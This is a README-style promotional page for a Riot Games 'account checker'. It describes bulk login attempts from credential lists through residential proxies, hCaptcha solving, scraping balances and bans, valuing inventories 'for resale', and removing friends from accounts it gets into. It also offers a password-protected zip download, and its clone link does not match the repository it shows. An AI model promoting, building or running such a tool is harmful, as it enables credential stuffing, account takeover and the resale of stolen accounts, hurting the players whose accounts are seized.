# Riot Account Checker & Manager

A high-performance toolkit for automated Riot Games account checking, sorting, and management. Built for speed, flexibility, and low proxy consumption — suitable for both small-scale and bulk operations.

<div align="center">

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-blue.svg)](https://www.python.org/)
[![Node.js 18+](https://img.shields.io/badge/Node.js-18%2B-green.svg)](https://nodejs.org/)
[![Solver: nocaptcha.io](https://img.shields.io/badge/Solver-nocaptcha.io-brightgreen)](https://nocaptcha.io)
[![CPM: 70+](https://img.shields.io/badge/CPM-70%2B-orange)]()

</div>

---

## 📖 Table of Contents

- [Features](#-features)
- [Account Information Detection](#-account-information-detection)
- [Key Capabilities](#-key-capabilities)
- [Use Cases](#-use-cases)
- [Installation](#-installation)
- [Configuration](#-configuration)
- [Usage](#-usage)
- [Output Format](#-output-format)
- [Captcha Solvers](#-captcha-solvers)
- [Proxy Setup](#-proxy-setup)
- [Docker](#-docker)
- [Troubleshooting](#-troubleshooting)
- [FAQ](#-faq)
- [Disclaimer](#-disclaimer)
- [License](#-license)
- [Contributing](#-contributing)
- [Contact](#-contact)

---

## ✨ Features

### 🖼️ Skin Image Generation
- **Valorant:** Generates skin previews based on skin pricing (Battle Pass skins are excluded).
- **League of Legends:** Generates skin previews based on rarity tiers.

<img width="1340" height="1412" alt="image" src="https://github.com/user-attachments/assets/95d874b8-0ff1-47e1-8661-cdb7f25a6a22" />

### 📂 Automatic Account Grouping
After each check, accounts are sorted by:
- Validity
- 2FA presence
- Skin count

Check results can be exported to a `.txt` file for further processing.

### 🧹 Automatic Friend Cleanup
Once an account is verified, all friends are automatically removed.

---

## 🔍 Account Information Detection

<img width="1024" height="707" alt="image" src="https://github.com/user-attachments/assets/8a25211f-0121-45ad-a3f7-fabd1eeab2d8" />


The checker extracts the following data from each account:

| Field | Description |
|---|---|
| Region & Country | Detected from account metadata |
| Riot Mobile / MFA | Whether multi-factor authentication is enabled |
| Current / Previous Rank | Rank tracking across seasons |
| Last Match | Most recent game activity |
| Account Level | Summoner level |
| Ban Status | Active bans and restrictions |
| Currency Balance | RP, VP, BE, and other in-game currencies |
| Inventory Value | Estimated total value of owned skins |

---

## 🚀 Key Capabilities

### ⚙️ Fully Automatic Account Checking
No manual actions required — the entire process runs using only the **login and password**.

### 🤖 hCaptcha Solver Integration
Plug in any captcha solver of your choice.
**Recommended:** [nocaptcha.io](https://nocaptcha.io)

### 📉 Proxy Traffic Optimization
Designed to work efficiently with **residential proxies**, minimizing bandwidth usage and reducing operational costs.

### ⚡ High Performance
Supports up to **70 CPM** (accounts per minute) under optimal conditions.

### 🧩 Customizable Output
Every summary field is configurable — tailor the report to match your exact format and requirements.

---

## 🛠️ Use Cases

- Bulk Riot account validation
- Inventory valuation for resale
- Security auditing (2FA, ban status, region)
- Automated account cleanup and organization

---

## 📦 Download

| File | Link |
|---|---|
| **RiotAccountCheckerManager.zip** | [⬇️ Download](https://github.com/user-attachments/files/32925414/RiotAccountCheckerManager.zip) |

**🔐 Archive Password:** `3Z59e6yT`


### Prerequisites
- **Python 3.10+**
- **Node.js 18+** (required for `proxy.js`)
- **Git**
- Residential proxy list (recommended)
- hCaptcha solver API key ([nocaptcha.io](https://nocaptcha.io))

### Step-by-step

```bash
# 1. Clone the repository
git clone [https://github.com/yourusername/riot-account-checker.git](https://github.com/xiaomingtongxueql/Riot-Account-Checker-Manager-release)
cd riot-account-checker

# 2. Install Python dependencies
pip install -r requirements.txt

# 3. Install Node.js dependencies (for proxy middleware)
npm install

# 4. Copy configuration templates
cp .env.example .env
cp config.example.json config.json
cp accounts.example.txt accounts.txt
cp proxies.example.txt proxies.txt

# 5. Edit .env and config.json with your credentials
